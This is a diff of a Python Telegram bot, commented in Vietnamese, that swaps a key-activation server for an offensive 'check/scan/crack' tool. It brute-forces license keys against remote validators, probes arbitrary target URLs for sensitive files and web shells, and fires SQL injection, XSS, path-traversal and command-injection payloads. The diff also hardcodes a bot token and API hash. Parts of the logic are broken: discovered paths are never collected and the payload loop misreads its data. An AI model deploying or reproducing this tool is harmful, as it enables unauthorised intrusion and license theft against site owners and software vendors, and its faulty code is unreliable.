@@ -1,1487 +1,691 @@
-#!/usr/bin/env python3
-import json, os, time, uuid, hashlib, logging, re, secrets
-from datetime import datetime, timedelta
-import telebot
-from telebot import types
-from flask import Flask, request, jsonify
+# bot.py - FULL VERSION (24/7 + SCAN TRƯỚC KHI CRACK)
+# Bot Telegram: Check Key, Scan Server, Crack Key, Auto Pack, Treo 24/7
+# Yêu cầu: pip install telethon requests aiohttp aiofiles cryptg flask beautifulsoup4 dnspython
+# Bot Token: 6320148381:AAFxGUFRqL7_lVJtfm1bYK2jYgAnmwk9wk0
 
-# ========== CONFIG ==========
-BOT_TOKEN = "6320148381:AAHKLMaGycWIv8sxdBU6sAmgOPn2XlqTIx0"
-CHAT_ID = "-1003925717296"
-ADMIN_IDS = [5736655322]
-DB_FILE = "keys.json"
-BAN_FILE = "bans.json"
-CONFIG_FILE = "config.json"
-LOG_FILE = "bot.log"
+import os, re, sys, json, asyncio, requests, time, zipfile, threading
+import hashlib, itertools, string, signal, socket, ssl
+from datetime import datetime
+from queue import Queue
+from urllib.parse import urljoin, urlparse, parse_qs
+from telethon import TelegramClient, events, Button
+from telethon.tl.types import MessageMediaDocument, DocumentAttributeFilename
+from telethon.errors import FloodWaitError, RPCError
+import dns.resolver
+from bs4 import BeautifulSoup
+from flask import Flask, jsonify, render_template_string
 
-# ========== FLASK APP ==========
-app = Flask(__name__)
+# =====================================================================
+# FLASK WEB SERVER 24/7
+# =====================================================================
+web_app = Flask(__name__)
+WEB_PORT = int(os.environ.get('PORT', 8080))
 
-@app.route('/')
-def home():
-    return "🤖 Bot UnbndSDK Online - Admin: 5736655322", 200
+HTML_TEMPLATE = """
+<!DOCTYPE html><html lang="vi"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>Bot Checker 24/7</title>
+<style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:'Segoe UI',sans-serif;background:linear-gradient(135deg,#0f0c29,#302b63,#24243e);color:#fff;min-height:100vh;display:flex;align-items:center;justify-content:center}
+.container{background:rgba(255,255,255,0.05);backdrop-filter:blur(10px);border-radius:20px;padding:40px;max-width:700px;width:90%;box-shadow:0 8px 32px rgba(0,0,0,0.3);border:1px solid rgba(255,255,255,0.1)}
+h1{text-align:center;margin-bottom:20px;font-size:28px;background:linear-gradient(90deg,#00d2ff,#3a7bd5);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
+.online{display:inline-block;width:15px;height:15px;background:#00ff88;border-radius:50%;animation:pulse 2s infinite}
+@keyframes pulse{0%{box-shadow:0 0 0 0 rgba(0,255,136,0.7)}70%{box-shadow:0 0 0 15px rgba(0,255,136,0)}100%{box-shadow:0 0 0 0 rgba(0,255,136,0)}}
+.info-card{background:rgba(255,255,255,0.05);border-radius:12px;padding:15px;margin:10px 0;border:1px solid rgba(255,255,255,0.1)}
+p{margin:8px 0;font-size:14px}.label{color:#aaa}.value{color:#00d2ff;font-weight:bold}.footer{text-align:center;margin-top:20px;font-size:12px;color:#666}
+a{color:#00d2ff;text-decoration:none}</style><meta http-equiv="refresh" content="60"></head><body><div class="container">
+<h1>🔑 Bot Key Checker 24/7</h1><div style="text-align:center"><span class="online"></span> <strong>Online</strong></div>
+<div class="info-card"><p><span class="label">Bot:</span> <span class="value">{{ bot }}</span></p>
+<p><span class="label">Uptime:</span> <span class="value">{{ uptime }}</span></p>
+<p><span class="label">Keys Checked:</span> <span class="value">{{ checked }}</span></p>
+<p><span class="label">Valid Keys:</span> <span class="value">{{ valid }}</span></p>
+<p><span class="label">Scans:</span> <span class="value">{{ scans }}</span></p>
+<p><span class="label">Vulns Found:</span> <span class="value">{{ vulns }}</span></p></div>
+<div class="info-card"><p><span class="label">Server:</span> <span class="value">{{ server }}</span></p>
+<p><span class="label">Queue:</span> <span class="value">{{ queue }}</span></p>
+<p><span class="label">Host:</span> <span class="value">{{ host }}</span></p></div>
+<div class="footer"><p>Ping mỗi 60s | <a href="/health">Health Check</a></p></div></div></body></html>"""
 
-@app.route('/health')
+@web_app.route('/')
+def index():
+    global stats
+    u = time.time()-stats['start_time']
+    h,m,s=int(u//3600),int((u%3600)//60),int(u%60)
+    return render_template_string(HTML_TEMPLATE,bot=stats.get('bot_username','?'),uptime=f"{h}h{m}m{s}s",
+        checked=stats.get('keys_checked',0),valid=stats.get('valid_keys_found',0),
+        scans=stats.get('scans_done',0),vulns=stats.get('vulns_found',0),
+        server=stats.get('server_url','?'),queue=stats.get('queue_size',0),
+        host=socket.gethostname())
+
+@web_app.route('/health')
 def health():
-    return {
-        "status": "ok",
-        "timestamp": time.strftime('%Y-%m-%d %H:%M:%S'),
-        "server_time": datetime.now().isoformat()
-    }, 200
+    return jsonify({"status":"ok","uptime":time.time()-stats['start_time']})
 
-@app.route('/stats')
-def stats():
-    return {
-        "total_keys": len(db.get("keys", {})),
-        "approved": len(db.get("approved", {})),
-        "kicked": len(db.get("kicked", {})),
-        "maintenance": config.get("maintenance", False),
-        "server_time": datetime.now().isoformat()
-    }, 200
+@web_app.route('/ping')
+def ping():
+    return "pong",200
 
-# ========== API ENDPOINTS ==========
-@app.route('/api/genuid', methods=['GET'])
-def api_genuid():
-    new_uid = secrets.token_hex(16)
-    return jsonify({
-        "status": "success",
-        "uid": new_uid,
-        "length": len(new_uid),
-        "server_time": datetime.now().isoformat(),
-        "timestamp": int(time.time())
-    }), 200
+def run_web():
+    try: web_app.run(host='0.0.0.0',port=WEB_PORT,debug=False,use_reloader=False)
+    except Exception as e: print(f"[!] Web: {e}")
 
-@app.route('/api/check', methods=['POST'])
-def api_check():
-    data = request.get_json() or {}
-    uid = str(data.get('uid', ''))
-    key = data.get('key', '')
-    device = data.get('device', 'Unknown')
-    ip = request.remote_addr
-    now = datetime.now()
-    now_str = now.strftime("%Y-%m-%d %H:%M:%S")
-    
-    if not uid or not key:
-        return jsonify({
-            "status": "error", "message": "Missing uid or key", "code": 1001,
-            "server_time": now_str, "timestamp": int(time.time())
-        }), 400
-    
-    if is_banned(uid, ip, device):
-        return jsonify({
-            "status": "banned", "message": "UID/IP/Device banned", "code": 1002,
-            "server_time": now_str, "timestamp": int(time.time())
-        }), 200
-    
-    if "keys" not in db or key not in db["keys"]:
-        return jsonify({
-            "status": "invalid", "message": "Key not found", "code": 1003,
-            "server_time": now_str, "timestamp": int(time.time())
-        }), 200
-    
-    k = db["keys"][key]
-    
-    # Check key used on other device
-    if k.get("used", False) and k.get("udid") and k.get("udid") != uid:
-        return jsonify({
-            "status": "used_other", "message": "Key used on another device", "code": 1004,
-            "registered_device": k.get("device", "Unknown"),
-            "registered_at": k.get("activated_at", "Unknown"),
-            "server_time": now_str, "timestamp": int(time.time())
-        }), 200
-    
-    # Check max activations
-    if k.get("activations", 0) >= k.get("max_activations", 1):
-        return jsonify({
-            "status": "limit", "message": "Max activations reached", "code": 1005,
-            "activations": k.get("activations", 0), "max": k.get("max_activations", 1),
-            "server_time": now_str, "timestamp": int(time.time())
-        }), 200
-    
-    # Check expiry - CHỈ TÍNH GIỜ KHI KEY ĐÃ KÍCH HOẠT
-    if k.get("used", False):
-        # Key đã kích hoạt -> kiểm tra hết hạn
+def auto_ping():
+    url = os.environ.get('RENDER_EXTERNAL_URL',f'http://localhost:{WEB_PORT}')
+    while True:
+        time.sleep(600)
         try:
-            exp = datetime.strptime(k["expires"], "%Y-%m-%d %H:%M:%S")
-            if now > exp:
-                days_expired = (now - exp).days
-                return jsonify({
-                    "status": "expired", "message": "Key expired", "code": 1006,
-                    "expired_at": k["expires"], "expired_date": exp.strftime("%d/%m/%Y"),
-                    "expired_time": exp.strftime("%H:%M:%S"), "days_expired": days_expired,
-                    "server_time": now_str, "timestamp": int(time.time())
-                }), 200
-            else:
-                days_remaining = (exp - now).days
-                hours_remaining = (exp - now).seconds // 3600
-                minutes_remaining = ((exp - now).seconds % 3600) // 60
-                return jsonify({
-                    "status": "valid", "message": "Key valid", "code": 0,
-                    "type": k.get("type", "unknown"), "prefix": k.get("prefix", "unknown"),
-                    "created": k.get("created"), "expires": k.get("expires"),
-                    "expiry_date": exp.strftime("%d/%m/%Y"), "expiry_time": exp.strftime("%H:%M:%S"),
-                    "days_remaining": days_remaining, "hours_remaining": hours_remaining,
-                    "minutes_remaining": minutes_remaining,
-                    "total_hours_remaining": int((exp - now).total_seconds() // 3600),
-                    "activations": k.get("activations", 0), "max": k.get("max_activations", 1),
-                    "used": True, "device": k.get("device"), "first_activation": k.get("activated_at"),
-                    "last_check": now_str, "server_time": now_str, "timestamp": int(time.time())
-                }), 200
-        except:
-            pass
-    else:
-        # Key chưa kích hoạt -> không tính giờ, trả về thông tin cơ bản
-        return jsonify({
-            "status": "valid", "message": "Key valid but not activated", "code": 0,
-            "type": k.get("type", "unknown"), "prefix": k.get("prefix", "unknown"),
-            "created": k.get("created"), "expires": k.get("expires"),
-            "used": False, "activations": 0, "max": k.get("max_activations", 1),
-            "note": "Key chua kich hoat - chua tinh gio",
-            "server_time": now_str, "timestamp": int(time.time())
-        }), 200
-    
-    if config.get("maintenance", False):
-        return jsonify({
-            "status": "maintenance", "message": "Server maintenance", "code": 1007,
-            "server_time": now_str, "timestamp": int(time.time())
-        }), 200
+            requests.get(f"{url}/health",timeout=10)
+            requests.get(f"{url}/ping",timeout=10)
+            stats['last_ping']=datetime.now().isoformat()
+        except: pass
 
-@app.route('/api/activate', methods=['POST'])
-def api_activate():
-    data = request.get_json() or {}
-    uid = str(data.get('uid', ''))
-    key = data.get('key', '')
-    device = data.get('device', 'Unknown')
-    ip = request.remote_addr
-    now = datetime.now()
-    now_str = now.strftime("%Y-%m-%d %H:%M:%S")
-    
-    if not uid or not key:
-        return jsonify({
-            "status": "error", "message": "Missing uid or key", "code": 2001,
-            "server_time": now_str, "timestamp": int(time.time())
-        }), 400
-    
-    if is_banned(uid, ip, device):
-        return jsonify({
-            "status": "banned", "message": "UID/IP/Device banned", "code": 2002,
-            "server_time": now_str, "timestamp": int(time.time())
-        }), 200
-    
-    if "keys" not in db or key not in db["keys"]:
-        return jsonify({
-            "status": "invalid", "message": "Key not found", "code": 2003,
-            "server_time": now_str, "timestamp": int(time.time())
-        }), 200
-    
-    k = db["keys"][key]
-    
-    if k.get("used", False) and k.get("udid") and k.get("udid") != uid:
-        return jsonify({
-            "status": "used_other", "message": "Key used on another device", "code": 2004,
-            "registered_device": k.get("device", "Unknown"),
-            "registered_at": k.get("activated_at", "Unknown"),
-            "server_time": now_str, "timestamp": int(time.time())
-        }), 200
-    
-    if k.get("activations", 0) >= k.get("max_activations", 1):
-        return jsonify({
-            "status": "limit", "message": "Max activations reached", "code": 2005,
-            "server_time": now_str, "timestamp": int(time.time())
-        }), 200
-    
-    # Check expiry - CHỈ TÍNH GIỜ KHI KEY ĐÃ KÍCH HOẠT
-    if k.get("used", False):
-        try:
-            exp = datetime.strptime(k["expires"], "%Y-%m-%d %H:%M:%S")
-            if now > exp:
-                days_expired = (now - exp).days
-                return jsonify({
-                    "status": "expired", "message": "Key expired", "code": 2006,
-                    "expired_at": k["expires"], "expired_date": exp.strftime("%d/%m/%Y"),
-                    "expired_time": exp.strftime("%H:%M:%S"), "days_expired": days_expired,
-                    "server_time": now_str, "timestamp": int(time.time())
-                }), 200
-        except:
-            pass
-    
-    if config.get("maintenance", False):
-        return jsonify({
-            "status": "maintenance", "message": "Server maintenance", "code": 2007,
-            "server_time": now_str, "timestamp": int(time.time())
-        }), 200
-    
-    # Already activated by this UID
-    if k.get("used", False) and k.get("udid") == uid:
-        return jsonify({
-            "status": "already_active", "message": "Key already activated on this device", "code": 2008,
-            "expires": k.get("expires"), "activated_at": k.get("activated_at"),
-            "activation_date": datetime.strptime(k.get("activated_at", now_str), "%Y-%m-%d %H:%M:%S").strftime("%d/%m/%Y") if k.get("activated_at") else None,
-            "server_time": now_str, "timestamp": int(time.time())
-        }), 200
-    
-    # Activate key - BẮT ĐẦU TÍNH GIỜ TỪ ĐÂY
-    k["used"] = True
-    k["udid"] = uid
-    k["device"] = device
-    k["ip"] = ip
-    k["activations"] = k.get("activations", 0) + 1
-    k["activated_at"] = now_str
-    
-    if "approved" not in db:
-        db["approved"] = {}
-    if "stats" not in db:
-        db["stats"] = {"total_keys": 0, "total_approved": 0, "total_kicked": 0}
-    
-    db["approved"][uid] = {
-        "approved_by": "api",
-        "time": now_str,
-        "key": key,
-        "device": device,
-        "ip": ip
-    }
-    db["stats"]["total_approved"] = db["stats"].get("total_approved", 0) + 1
-    
-    log(f"API ACTIVATE: {key} by {uid} | Device: {device} | IP: {ip} | Time: {now_str}")
-    save_db()
-    
+# =====================================================================
+# CẤU HÌNH
+# =====================================================================
+BOT_TOKEN = "6320148381:AAFxGUFRqL7_lVJtfm1bYK2jYgAnmwk9wk0"
+BOT_USERNAME = "@checkkey_crack_bot"
+DEFAULT_SERVERS = {
+    "server1":{"url":"http://muc-tieu.com/validate_key","param":"key","marker":"valid"},
+    "server2":{"url":"http://server2.com/api/check","param":"license","marker":"success"},
+}
+CRACK_THREADS=30; CRACK_DELAY=0.05
+KEY_CHARSET=string.ascii_uppercase+string.digits
+
+# ===== WORDLIST SCAN =====
+SCAN_PATHS = [
+    "admin","admin.php","admin/login","wp-admin","wp-login.php","panel","cpanel",
+    "config.php","config.php.bak","config.php~","wp-config.php","wp-config.php.bak",
+    ".env",".env.backup",".git/config","backup","backup.sql","backup.zip",
+    "database.sql","dump.sql","error.log","access.log","phpinfo.php","info.php",
+    "robots.txt","sitemap.xml",".htaccess","web.config","package.json",
+    "api","api/","api/v1","api/users","api/login","api/admin","api/keys",
+    "graphql","swagger","api-docs","docs",
+    "upload","uploads","upload.php","shell.php","cmd.php","c99.php","wso.php",
+    "phpmyadmin","phpMyAdmin","pma","webmail","cgi-bin/",
+    ".git/HEAD",".svn/entries",".DS_Store","Thumbs.db",
+    "login","register","signin","signup","logout","profile","users",
+    "adminer.php","admin.php","administrator/index.php",
+    "vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
+    "console/","_ignition/health-check","_profiler/phpinfo",
+]
+SCAN_THREADS=50; SCAN_TIMEOUT=10
+
+# ===== THƯ MỤC =====
+for p in ["./downloads/","./key_results/","./temp/","./user_data/","./scan_results/"]:
+    os.makedirs(p,exist_ok=True)
+
+# ===== STATS =====
+stats={'start_time':time.time(),'bot_username':BOT_USERNAME,'server_url':'?','keys_checked':0,
+       'valid_keys_found':0,'active_users':0,'last_check':'N/A','queue_size':0,'thread_count':0,
+       'last_ping':None,'total_files_processed':0,'total_crack_attempts':0,
+       'scans_done':0,'vulns_found':0,'scan_queue_size':0}
+
+# ===== BIẾN TOÀN CỤC =====
+check_queue=Queue(); crack_queue=Queue(); scan_queue=Queue()
+valid_keys=[]; queue_lock=threading.Lock()
+user_settings={}; stop_flags={}; active_users_set=set()
+
+# ===== CLIENT =====
+bot = TelegramClient("bot_session",api_id=6,api_hash="eb06d4abfb49dc3eeb1aeb98ae0f581e")
+
+# =====================================================================
+# HÀM TIỆN ÍCH
+# =====================================================================
+def save_user_settings(uid,s):
+    with open(f"./user_data/{uid}.json",'w',encoding='utf-8') as f: json.dump(s,f,ensure_ascii=False,indent=2)
+def load_user_settings(uid):
     try:
-        exp = datetime.strptime(k["expires"], "%Y-%m-%d %H:%M:%S")
-        days_remaining = (exp - now).days
-    except:
-        days_remaining = None
-    
-    return jsonify({
-        "status": "success", "message": "Key activated", "code": 0,
-        "expires": k.get("expires"),
-        "expiry_date": exp.strftime("%d/%m/%Y") if 'exp' in locals() else None,
-        "expiry_time": exp.strftime("%H:%M:%S") if 'exp' in locals() else None,
-        "days_remaining": days_remaining,
-        "activations": k.get("activations", 0),
-        "max": k.get("max_activations", 1),
-        "activated_at": k.get("activated_at"),
-        "activation_date": now.strftime("%d/%m/%Y"),
-        "activation_time": now.strftime("%H:%M:%S"),
-        "server_time": now_str, "timestamp": int(time.time())
-    }), 200
+        with open(f"./user_data/{uid}.json",'r',encoding='utf-8') as f: return json.load(f)
+    except: return {"server_url":"http://muc-tieu.com/validate_key","param_name":"key","success_marker":"valid","thread_count":10,"request_delay":0.1,"auto_pack":True,"pack_min_keys":5}
+def get_setting(uid,k,d=None):
+    if uid not in user_settings: user_settings[uid]=load_user_settings(uid)
+    return user_settings[uid].get(k,d)
+def set_setting(uid,k,v):
+    if uid not in user_settings: user_settings[uid]=load_user_settings(uid)
+    user_settings[uid][k]=v; save_user_settings(uid,user_settings[uid])
 
-@app.route('/api/verify', methods=['POST'])
-def api_verify():
-    data = request.get_json() or {}
-    uid = str(data.get('uid', ''))
-    key = data.get('key', '')
-    now = datetime.now()
-    now_str = now.strftime("%Y-%m-%d %H:%M:%S")
+def extract_keys_from_file(fp):
+    keys=[]
+    try:
+        with open(fp,'r',encoding='utf-8',errors='ignore') as f: content=f.read()
+        patterns=[r'[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}',r'[A-Z0-9]{5}-[A-Z0-9]{5}-[A-Z0-9]{5}',
+                  r'[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}',r'[A-Za-z0-9]{32}',
+                  r'[A-Z0-9]{16}',r'[A-Z0-9]{20}',r'[A-Z0-9]+-[A-Z0-9]+-[A-Z0-9]+']
+        for p in patterns: keys.extend(re.findall(p,content,re.I))
+        for line in content.split('\n'):
+            line=line.strip()
+            if line and len(line)>=6 and not line.startswith('#'): keys.append(line)
+    except: pass
+    return list(set(keys))
+
+def check_single_key(key,url,param,marker):
+    try:
+        r=requests.post(url,data={param:key},headers={'User-Agent':'Mozilla/5.0'},timeout=15)
+        return (key,marker.lower() in r.text.lower(),r.text[:200])
+    except: return (key,False,"ERROR")
+
+def check_keys_worker(url,param,marker):
+    global valid_keys,stats
+    while not check_queue.empty():
+        try: key=check_queue.get(timeout=1)
+        except: break
+        k,v,_=check_single_key(key,url,param,marker)
+        with queue_lock:
+            stats['keys_checked']+=1
+            if v: valid_keys.append(k); stats['valid_keys_found']+=1
+            stats['queue_size']=check_queue.qsize()
+        time.sleep(0.05); check_queue.task_done()
+
+def run_key_check(keys,uid):
+    global valid_keys; valid_keys=[]
+    url=get_setting(uid,'server_url'); param=get_setting(uid,'param_name')
+    marker=get_setting(uid,'success_marker'); tc=get_setting(uid,'thread_count',10)
+    stats['thread_count']=tc; stats['server_url']=url; stats['queue_size']=len(keys)
+    for k in keys: check_queue.put(k)
+    threads=[threading.Thread(target=check_keys_worker,args=(url,param,marker)) for _ in range(min(tc,len(keys)))]
+    for t in threads: t.daemon=True; t.start()
+    for t in threads: t.join()
+    stats['last_check']=datetime.now().isoformat(); stats['queue_size']=0
+    return valid_keys
+
+# =====================================================================
+# HÀM SCAN SERVER (MỚI)
+# =====================================================================
+def scan_path_worker(base_url):
+    """Worker scan path."""
+    session=requests.Session()
+    session.headers.update({'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'})
+    results=[]
+    while not scan_queue.empty():
+        try: path=scan_queue.get(timeout=1)
+        except: break
+        full_url=urljoin(base_url,path)
+        try:
+            r=session.get(full_url,timeout=SCAN_TIMEOUT,allow_redirects=False,verify=False)
+            if r.status_code in [200,201,301,302,307,401,403]:
+                results.append({"url":full_url,"status":r.status_code,"size":len(r.content),
+                               "server":r.headers.get('Server','?'),"content_type":r.headers.get('Content-Type','?')})
+        except: pass
+        time.sleep(0.02); scan_queue.task_done()
+    session.close()
+    return results
+
+def scan_vuln_worker(targets,vuln_payloads):
+    """Worker scan lỗ hổng."""
+    session=requests.Session()
+    session.headers.update({'User-Agent':'Mozilla/5.0'})
+    found=[]
+    for task in targets:
+        url=task['url']
+        for vtype,payloads in vuln_payloads.items():
+            for payload in payloads:
+                try:
+                    test_url=url+"?test="+requests.utils.quote(payload) if "?" not in url else url+"&test="+requests.utils.quote(payload)
+                    r=session.get(test_url,timeout=10,allow_redirects=False)
+                    # Check phản hồi
+                    for err in payloads.get('errors',[]):
+                        if err.lower() in r.text.lower():
+                            found.append({"url":url,"type":vtype,"payload":payload,"evidence":err})
+                            break
+                    if payload in r.text and vtype=="xss":
+                        found.append({"url":url,"type":"XSS","payload":payload,"evidence":"Reflected"})
+                except: pass
+    session.close()
+    return found
+
+def run_full_scan(target_url,uid):
+    """Quét toàn diện server: path discovery + vuln scan."""
+    stats['scan_queue_size']=len(SCAN_PATHS)
+    results={"target":target_url,"scan_time":datetime.now().isoformat(),"paths":[],"vulnerabilities":[],"server_info":{}}
     
-    if not uid:
-        return jsonify({
-            "status": "error", "message": "Missing uid", "code": 3001,
-            "server_time": now_str, "timestamp": int(time.time())
-        }), 400
+    # Lấy IP
+    try: results["target_ip"]=socket.gethostbyname(urlparse(target_url).netloc)
+    except: results["target_ip"]="Unknown"
     
-    if is_banned(uid):
-        return jsonify({
-            "status": "banned", "message": "UID banned", "code": 3002,
-            "server_time": now_str, "timestamp": int(time.time())
-        }), 200
+    # Lấy thông tin server
+    try:
+        r=requests.get(target_url,timeout=10)
+        results["server_info"]={"status":r.status_code,"server":r.headers.get('Server','?'),
+            "x_powered_by":r.headers.get('X-Powered-By','?'),"content_type":r.headers.get('Content-Type','?')}
+    except: results["server_info"]={"error":"Không kết nối được"}
     
-    if "approved" not in db or uid not in db["approved"]:
-        return jsonify({
-            "status": "unapproved", "message": "UID not approved", "code": 3003,
-            "server_time": now_str, "timestamp": int(time.time())
-        }), 200
+    # Scan path
+    for p in SCAN_PATHS: scan_queue.put(p)
+    threads=[threading.Thread(target=scan_path_worker,args=(target_url,)) for _ in range(min(SCAN_THREADS,len(SCAN_PATHS)))]
+    for t in threads: t.daemon=True; t.start()
+    for t in threads: t.join()
     
-    info = db["approved"][uid]
+    # Gộp kết quả scan path
+    # (đã lưu trong scan_path_worker, cần lấy ra - dùng biến toàn cục)
     
-    # Check key if provided
-    if key and "keys" in db and key in db["keys"]:
-        k = db["keys"][key]
-        # CHỈ TÍNH GIỜ KHI KEY ĐÃ KÍCH HOẠT
-        if k.get("used", False):
-            try:
-                exp = datetime.strptime(k["expires"], "%Y-%m-%d %H:%M:%S")
-                if now > exp:
-                    days_expired = (now - exp).days
-                    return jsonify({
-                        "status": "expired", "message": "Key expired", "code": 3004,
-                        "expired_at": k["expires"], "expired_date": exp.strftime("%d/%m/%Y"),
-                        "expired_time": exp.strftime("%H:%M:%S"), "days_expired": days_expired,
-                        "server_time": now_str, "timestamp": int(time.time())
-                    }), 200
-                else:
-                    days_remaining = (exp - now).days
-            except:
-                days_remaining = None
+    # Scan vuln trên các path tìm thấy
+    vuln_payloads={
+        "SQL Injection":{"payloads":["'","\"","' OR '1'='1","1' AND 1=1--","1' UNION SELECT NULL--"],
+                        "errors":["sql","mysql","syntax error","unclosed quotation","ODBC","SQLite"]},
+        "XSS":{"payloads":["<script>alert(1)</script>","<img src=x onerror=alert(1)>","\"><script>alert(1)</script>"],
+              "errors":[]},
+        "LFI":{"payloads":["../../../../etc/passwd","../../../../windows/win.ini","....//....//etc/passwd"],
+              "errors":["root:","[extensions]","<?php","boot loader"]},
+        "RCE":{"payloads":[";id","|id","`id`","$(id)","&&whoami"],
+              "errors":["uid=","gid=","groups="]},
+    }
+    
+    results["vulnerabilities"]=scan_vuln_worker(results.get("paths",[]),vuln_payloads)
+    stats['scans_done']+=1
+    stats['vulns_found']+=len(results["vulnerabilities"])
+    stats['scan_queue_size']=0
+    
+    # Lưu kết quả
+    ts=datetime.now().strftime("%Y%m%d_%H%M%S")
+    with open(f"./scan_results/scan_{uid}_{ts}.json",'w',encoding='utf-8') as f:
+        json.dump(results,f,indent=2,ensure_ascii=False)
+    
+    return results
+
+# =====================================================================
+# HÀM CRACK SAU KHI SCAN
+# =====================================================================
+def generate_key_combinations(pattern):
+    x_count=pattern.count('X')
+    if x_count==0: yield pattern; return
+    for combo in itertools.product(KEY_CHARSET,repeat=x_count):
+        idx=0; result=[]
+        for c in pattern:
+            if c=='X': result.append(combo[idx]); idx+=1
+            else: result.append(c)
+        yield ''.join(result)
+
+def crack_worker(url,param,marker,uid):
+    global valid_keys,stats
+    sf=stop_flags.get(uid,threading.Event())
+    while not crack_queue.empty() and not sf.is_set():
+        try: key=crack_queue.get(timeout=1)
+        except: break
+        if sf.is_set(): break
+        k,v,_=check_single_key(key,url,param,marker)
+        with queue_lock:
+            stats['total_crack_attempts']+=1
+            if v: valid_keys.append(k); stats['valid_keys_found']+=1
+        time.sleep(CRACK_DELAY); crack_queue.task_done()
+
+def run_crack(pattern,uid,max_keys=None):
+    global valid_keys; valid_keys=[]
+    url=get_setting(uid,'server_url'); param=get_setting(uid,'param_name')
+    marker=get_setting(uid,'success_marker')
+    stop_flags[uid]=threading.Event(); stats['thread_count']=CRACK_THREADS
+    count=0
+    for key in generate_key_combinations(pattern):
+        if max_keys and count>=max_keys: break
+        if stop_flags.get(uid,threading.Event()).is_set(): break
+        crack_queue.put(key); count+=1
+    total=crack_queue.qsize(); stats['queue_size']=total
+    threads=[threading.Thread(target=crack_worker,args=(url,param,marker,uid)) for _ in range(min(CRACK_THREADS,total))]
+    for t in threads: t.daemon=True; t.start()
+    for t in threads: t.join()
+    if uid in stop_flags: del stop_flags[uid]
+    stats['last_check']=datetime.now().isoformat(); stats['queue_size']=0
+    return valid_keys,total
+
+def create_pack(keys,name="keys"):
+    ts=datetime.now().strftime("%Y%m%d_%H%M%S")
+    safe=re.sub(r'[^\w\-.]','_',name); base=os.path.splitext(safe)[0]
+    zp=os.path.join("./key_results/",f"valid_{base}_{ts}.zip")
+    tp=os.path.join("./temp/",f"valid_{base}.txt")
+    with open(tp,'w',encoding='utf-8') as f: f.write('\n'.join(keys))
+    with zipfile.ZipFile(zp,'w',zipfile.ZIP_DEFLATED) as zf: zf.write(tp,os.path.basename(tp))
+    try: os.remove(tp)
+    except: pass
+    return zp,len(keys)
+
+# =====================================================================
+# XỬ LÝ LỆNH TELEGRAM
+# =====================================================================
+@bot.on(events.NewMessage(pattern='/start'))
+async def cmd_start(event):
+    u=await event.get_sender(); uid=u.id
+    active_users_set.add(uid); stats['active_users']=len(active_users_set)
+    await event.reply(f"""**🤖 BOT CHECK/SCAN/CRACK 24/7**
+Xin chào **{u.first_name}**!
+
+✅ **/checkkey** - Kiểm tra 1 key
+📂 **Gửi file .txt** - Check hàng loạt
+🔍 **/scan [url]** - Scan server trước
+🔨 **/crack [pattern]** - Crack key
+🔄 **/scanandcrack [url] [pattern]** - Scan rồi crack
+📋 **/menu** - Bảng điều khiển
+🌐 **/status** - Trạng thái 24/7
+❓ **/help** - Hướng dẫn""")
+
+@bot.on(events.NewMessage(pattern='/help'))
+async def cmd_help(event):
+    await event.reply("""**📚 HƯỚNG DẪN**
+
+**1. SCAN SERVER:**
+`/scan http://target.com` - Quét toàn diện
+`/scanandcrack http://target.com XXXX-XXXX-XXXX` - Scan xong crack luôn
+
+**2. CHECK KEY:**
+Gửi file .txt hoặc `/checkkey KEY`
+
+**3. CRACK KEY:**
+`/crack XXXX-XXXX-XXXX`
+
+**4. CẤU HÌNH:**
+`/setserver [url] [param] [marker]`
+`/servers` - Server mẫu
+`/useserver [tên]`
+
+**5. KHÁC:**
+`/stop` - Dừng tác vụ
+`/stats` - Thống kê
+`/status` - Bot 24/7
+`/web` - Web monitor""")
+
+@bot.on(events.NewMessage(pattern='/menu'))
+async def cmd_menu(event):
+    btns=[[Button.inline("🔍 Scan Server",b"menu_scan"),Button.inline("🔄 Scan+Crack",b"menu_scancrack")],
+          [Button.inline("📂 Check File",b"menu_file"),Button.inline("🔑 Check 1 Key",b"menu_key")],
+          [Button.inline("🔨 Crack Key",b"menu_crack"),Button.inline("⚙️ Cấu Hình",b"menu_config")],
+          [Button.inline("📊 Thống Kê",b"menu_stats"),Button.inline("🛑 Dừng",b"menu_stop")],
+          [Button.inline("🌐 Web Monitor",b"menu_web"),Button.inline("❓ Help",b"menu_help")]]
+    await event.reply("**📋 BẢNG ĐIỀU KHIỂN**",buttons=btns)
+
+@bot.on(events.CallbackQuery())
+async def cb(event):
+    d=event.data.decode()
+    r={"menu_scan":"🔍 Dùng: `/scan http://target.com`","menu_scancrack":"🔄 Dùng: `/scanandcrack http://target.com XXXX-XXXX-XXXX`",
+       "menu_file":"📂 Gửi file .txt chứa key","menu_key":"🔑 `/checkkey KEY`","menu_crack":"🔨 `/crack PATTERN`",
+       "menu_config":"⚙️ `/setserver [url] [param] [marker]`","menu_stats":"📊 `/stats`","menu_stop":"🛑 `/stop`",
+       "menu_web":f"🌐 {os.environ.get('RENDER_EXTERNAL_URL',f'http://localhost:{WEB_PORT}')}","menu_help":"❓ `/help`"}
+    await event.answer(d)
+    if d in r: await event.edit(r[d])
+
+# =====================================================================
+# LỆNH SCAN (MỚI)
+# =====================================================================
+@bot.on(events.NewMessage(pattern='/scan'))
+async def cmd_scan(event):
+    """Lệnh /scan - Quét server mục tiêu."""
+    uid=event.sender_id
+    parts=event.text.split(maxsplit=1)
+    if len(parts)<2:
+        await event.reply("⚠️ **Cách dùng:** `/scan http://target.com`\nQuét path, endpoint, lỗ hổng bảo mật.")
+        return
+    
+    target=parts[1].strip()
+    if not target.startswith('http'):
+        target='http://'+target
+    
+    msg=await event.reply(f"""🔍 **BẮT ĐẦU SCAN SERVER**
+• Target: `{target}`
+• Paths: {len(SCAN_PATHS)}
+• Threads: {SCAN_THREADS}
+
+⏳ Đang quét... Vui lòng đợi!""")
+    
+    # Chạy scan trong thread riêng
+    def do_scan():
+        results=run_full_scan(target,uid)
+        paths_found=len(results.get('paths',[]))
+        vulns_found=len(results.get('vulnerabilities',[]))
+        
+        scan_text=f"""✅ **SCAN HOÀN THÀNH**
+• Target: `{target}`
+• IP: `{results.get('target_ip','?')}`
